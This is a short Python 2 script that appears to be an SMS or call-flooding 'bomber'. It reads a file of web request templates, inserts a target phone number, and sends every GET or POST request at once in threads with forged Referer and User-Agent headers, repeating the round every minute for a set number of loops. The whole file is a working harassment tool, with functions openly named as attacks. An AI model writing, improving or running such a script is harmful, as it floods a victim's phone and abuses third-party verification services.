#!/usr/bin/env python
#coding:utf-8
__author__ = 'mtfly'


import requests,sys,time,threading
from re import split,sub
from optparse import OptionParser

p = OptionParser()
p.add_option('-n','--number',default=13999999999, help='The phone\'number')
p.add_option('-l','--loop',default=10, help='The number of loop')
options, args = p.parse_args()
pn=options.number
loop=int(options.loop)
m=list()

def attack_post(mtfly):
    url=mtfly[1]
    mtfly[2]=split('&',mtfly[2])
    dics={}
    for i in range(len(mtfly[2])):
        mtfly[2][i]=split('=',mtfly[2][i])
        dics.setdefault(mtfly[2][i][0],mtfly[2][i][1])
    payload=dics
    headers={'Referer': mtfly[3],
             'User-Agent': 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)'}
    try:
        requests.post(url,data=payload,headers=headers)
        print url,payload,headers
        print 'post success!'
    except Exception,e:
        print e
        print 'post fail!'

def attack_get(mtfly):
    url=mtfly[1]
    headers={'Referer': mtfly[3],
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)'}
    try:
        requests.get(url,headers=headers)
        print url,headers
        print 'get success!'
    except Exception,e:
        print e
        print 'get fail!'
        
def attack(mi):
    mtfly = split('::|\n', mi)
    if mtfly[0]=='get':
        attack_get(mtfly)
    elif mtfly[0]=='post':
        attack_post(mtfly)
        
def t_attack(m):
    threads=[]
    nloops=range(len(m))
    for i in nloops:        
        t=threading.Thread(target=attack,args=(m[i],))
        threads.append(t)
    for i in nloops:
        threads[i].start()
    for i in nloops:     
        threads[i].join()

        
    
try:
    f= open('mtfly.txt','r')
except Exception,e:
    print e
    print 'flie fail!'
for eachLine in f.readlines():
    eachLine=sub('phone_number',pn,eachLine)
    eachLine=eachLine.strip()
    m.append(eachLine)
for il in range(loop):
    t_attack(m)
    time.sleep(60)
f.close( )
print 'all jobs done!'





        
